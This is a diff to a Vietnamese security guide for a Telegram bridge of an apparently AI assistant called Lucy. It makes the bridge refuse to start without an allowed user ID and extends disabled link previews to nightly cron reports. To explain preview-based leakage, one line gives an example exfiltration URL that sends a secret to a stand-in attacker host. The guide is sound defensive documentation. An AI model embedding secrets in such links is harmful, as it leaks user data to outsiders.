@@ -28,7 +28,7 @@ Các đường tấn công chính:
 Bridge chỉ trả lời user Telegram có ID số khớp với `LUCY_ALLOWED_USER_ID` (trong `bridge/.env`). Người khác nhận "⛔ Không có quyền."
 
 ::: danger Đặt biến này trước khi chạy bot
-Nếu `LUCY_ALLOWED_USER_ID` **để trống, bridge trả lời bất kỳ ai** tìm ra bot. Khi đó tin nhắn trạng thái hiện `uid=(mở!)`. Luôn đặt nó:
+Nếu `LUCY_ALLOWED_USER_ID` **để trống, bridge từ chối khởi động**. Cách duy nhất để chạy ở chế độ mở là đặt thêm `LUCY_ALLOW_ANYONE=1`; khi đó bridge trả lời bất kỳ ai tìm ra bot và tin nhắn trạng thái hiện `uid=(mở!)`. Đừng làm vậy. Luôn đặt ID:
 
 ```ini
 LUCY_ALLOWED_USER_ID=<id-telegram-dạng-số-của-bạn>
@@ -37,7 +37,7 @@ LUCY_ALLOWED_USER_ID=<id-telegram-dạng-số-của-bạn>
 
 ### Tắt link preview
 
-Mọi tin bridge gửi đi đều qua một hàm chung, hàm này đặt `link_preview_options.is_disabled = true`. Để tạo link preview, server Telegram sẽ tự mở URL, nên một link bị cài kiểu `https://attacker.example/?d=<secret>` có thể làm lộ dữ liệu mà không cần ai bấm vào. Tin đẩy từ lịch của hub và cảnh báo của token guard cũng tắt preview. Bridge còn thay token bot bằng `<bot-token>` trong log lỗi.
+Mọi tin bridge gửi đi đều qua một hàm chung, hàm này đặt `link_preview_options.is_disabled = true`. Để tạo link preview, server Telegram sẽ tự mở URL, nên một link bị cài kiểu `https://attacker.example/?d=<secret>` có thể làm lộ dữ liệu mà không cần ai bấm vào. Tin đẩy từ lịch của hub, cảnh báo của token guard và báo cáo của cron dream ban đêm cũng tắt preview, nên mọi tin Telegram Lucy gửi đi đều không có preview. Bridge còn thay token bot bằng `<bot-token>` trong log lỗi.
 
 ### Đăng nhập hub
 
